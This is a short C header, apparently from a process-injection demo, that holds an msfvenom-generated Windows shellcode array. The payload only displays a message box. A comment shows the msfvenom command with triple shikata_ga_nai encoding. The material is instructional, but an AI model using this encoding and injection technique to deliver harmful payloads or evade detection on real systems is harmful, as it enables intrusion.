#pragma once

/*
msfvenom -a x86 --platform Windows 
-p windows/messagebox 
TEXT="This is Injection demo #2! Payload powered by: msfvenom" 
TITLE="hasherezade's Injection Demo #2" 
-e x86/shikata_ga_nai -b '\x00' -i 3 -f c
*/
	unsigned char g_Shellcode[] = 
"\xbb\x66\x47\xbe\xbb\xd9\xc0\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x64\x31\x5e\x12\x83\xee\xfc\x03\x38\x49\x5c\x4e\x7f\xdc\x98"
"\xcc\x18\x05\x12\xf7\x92\x9d\x57\x52\x6b\x17\x26\x3e\xba\xfd"
"\x5a\xc2\xe6\x12\xde\x06\x9b\xcf\x68\x38\xe2\x2c\x6f\x20\x49"
"\xfc\x51\x8b\x30\x64\x61\x50\xc2\xac\xdf\x8a\x75\x06\x80\x0c"
"\x37\xae\xe3\xcb\x93\x57\xfa\x55\xbc\x32\xd1\x40\xb2\x3b\x2b"
"\x06\x0c\x49\xea\x89\xeb\x4e\x2a\x40\xa7\xab\x1f\x8d\x36\x50"
"\xbd\x43\x9d\xfa\xb7\xc4\x98\xa1\x89\x0d\x5e\x47\x46\x4a\x30"
"\xad\x15\xf3\x5b\x57\x96\xb3\x12\x8c\xf9\x69\x15\x1a\x2e\xe0"
"\x7a\x04\x3c\xbd\x26\x10\xba\x10\xc0\x44\x4d\x73\x0d\x44\xbe"
"\x86\xe9\x40\x46\xa3\xd2\xda\x04\xbd\xca\x4a\x35\xc3\x48\x53"
"\xc9\x74\x19\x0d\x34\xe6\xc3\x2d\x3d\xa8\xcf\xde\xe2\x3c\xf6"
"\x39\x5d\xdc\xeb\xe9\xde\xd1\x3d\xce\x6c\xc7\x67\xfe\xb2\xb5"
"\x35\xe1\x22\x82\x24\x9c\xb3\x54\x64\xb6\xa9\xc0\xe5\xa1\x4f"
"\x99\x2b\xf9\x9b\x0b\xc7\xee\xa7\x7f\xb0\xe3\x77\x69\x84\xcc"
"\xf6\x99\x2a\x22\x6d\x1e\x60\xde\xb9\xc1\x41\x24\xa2\x5e\x77"
"\x57\x88\x9e\xc1\xf1\xd9\x33\x4d\xe6\x97\x06\xe4\x36\x1c\x68"
"\x55\xed\x91\x05\xf4\x05\x86\x5d\x26\x47\x2c\xf8\x8b\xa0\x3b"
"\x49\x2f\x80\x4b\x5e\x3c\x8e\xd7\x35\xbb\x3f\xf8\x49\xa2\x72"
"\xb8\x29\x19\x2d\x14\xc3\x8d\xb8\xb8\x08\x35\xec\x5c\x5a\x83"
"\x0e\x32\x44\xb7\x81\xda\xe1\x13\xf5\xf2\x57\x42\xcf\x31\xa0"
"\x2a\xc3\xb9\x99\x25\x5f\x49\xc5\xa8\x75\x2d\xa1\x5b\x02\x28"
"\x05\x86\x91\x42\xa4\x99\xaa\x3e\xe8\x4a\x3d\xe7\x1c\x47\xe1"
"\xe0\xd9\xb5\x6f\x41\xb6\x34\x41\x11\xf0\xe0\x65\x64\x8e\x5f"
"\x28\xbc\x26\xee\x6b\x02\xf3\x13\xfc\x19\x90\xe6\x84\x0f\x99"
"\xfc\xe8\x3a\x35\x9f\x30\xd9\x19\x25\x38\x90\x85\x35\x3a\x81"
"\xe0\x83\xf6\xcb\xba\xf7\xe6\x9a\x3e\xc4\x04\x24\x73\x92\x55"
"\xff\x59\x6e\x79\x18\xc1\x68\x75\x2f\x83\x1b\xe8\x17\xff\xa9"
"\x1b\x69\xf6";
